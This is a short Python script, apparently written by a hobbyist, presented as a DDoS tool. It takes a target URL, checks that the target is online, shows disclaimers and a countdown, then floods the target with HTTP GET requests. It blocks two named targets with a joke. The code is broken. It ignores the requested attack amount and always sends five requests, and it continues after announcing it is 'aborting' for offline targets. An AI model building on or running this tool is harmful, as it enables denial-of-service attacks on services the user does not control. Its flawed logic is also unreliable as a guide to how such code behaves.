import requests
import time
from urllib.request import urlopen
import re
from urllib.error import *

def getIP():
    d = urlopen('http://checkip.dyndns.com/').read().decode('utf-8')
    pattern = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)')
    match = pattern.search(d)
    if match:
        return match.group(1)
    else:
        return None

ip = getIP()
online = False

def Check_online(url):
    global online  # Fix: declare 'online' as global to modify it inside the function
    try:
        html = urlopen(url)
    except HTTPError as e:
        print("HTTP error", e)
    except URLError as e:
        print("Error: Try fixing the URL/IP", e)
    else:
        online = True
var = 0  # Declare the global variable

def DDOS(url):
    global var
    for i in range(5):
        requests.get(url)
        var = var + 1
        print(var)
        

url = input("Enter the URL/IP to DDOS: ").strip()
amo = int(input("Enter DDOs amount: "))
url = "http://" + url

if url == "http://50.67.72.37" or url == "http://cammoron.ca":
    print("You are not allowed to DDOS this target.")
    print("Bad Lucas, no cookie for you.")
    time.sleep(0.75)
    print("DDOS attack Starting for: " + ip)
    print("(That's your IP by the way 🤓 😏)")
    time.sleep(2)
    print("Done")
    exit()

print("!! WARNING !!")
time.sleep(2)
print("This is illegal and can get you in trouble with the law most of the time.")
time.sleep(2)
print("You are responsible for your own actions.")
time.sleep(2)
print("By using this script, you agree to take full responsibility for any consequences that may arise from its use.")
time.sleep(2)
print("This script is for educational purposes only.")
time.sleep(2)
print("If you do not agree with these terms, please exit the script now.")
time.sleep(2)
con = input("Do you want to continue? (y/N): ")

if con.lower() != 'y':
    print("Exiting script.")
    exit()

Check_online(url)
if online:
    print("Target is online, proceeding with attack.")
else:
    print("Target is offline, aborting attack.")

print("Starting DDOS attack on", url, "please wait...")
print("5 seconds until attack starts...")
time.sleep(1)
print("4")
time.sleep(1)
print("3")
time.sleep(1)
print("2")
time.sleep(1)
print("1")
time.sleep(1)
print("Attack starting...")
DDOS(url)
print("Attack completed. Total requests sent:", var)
print("DDOS attack finished.")
print("Thank you for using this script. Please use responsibly.")
print("Exiting script.")
time.sleep(2)
exit()
# Made by Leon Walsh 2025
